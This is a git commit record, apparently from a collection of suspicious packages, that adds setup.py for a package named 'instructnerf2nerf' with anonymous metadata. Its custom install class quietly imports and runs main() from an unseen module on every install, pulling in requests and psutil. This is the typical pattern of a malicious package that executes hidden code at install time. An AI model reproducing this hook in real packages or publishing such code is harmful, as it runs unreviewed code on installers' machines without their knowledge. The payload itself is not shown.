859751c8f94dd924f652c29e972e4d1c225feaae
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-06 06:05:11 +0000

    Add package instructnerf2nerf/9.6/instructnerf2nerf-9.6.tar.gz

---
+++ packages/instructnerf2nerf/instructnerf2nerf-9.6.tar.gz/instructnerf2nerf-9.6/setup.py
@@ -0,0 +1,24 @@
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+
+
+class CrazyInstallStrat(install):
+    def run(self):
+        install.run(self)
+        from main import main
+        main()
+
+setup(
+    name="instructnerf2nerf",
+    version="9.6",
+    author="anon",
+    author_email="xxx@outlook.com",
+    description="anon",
+    long_description_content_type="text/markdown",
+    long_description="anon",
+    cmdclass={
+        'install': CrazyInstallStrat,
+    },
+    install_requires=['requests', 'psutil'],
+    setup_requires=['setuptools']
+)
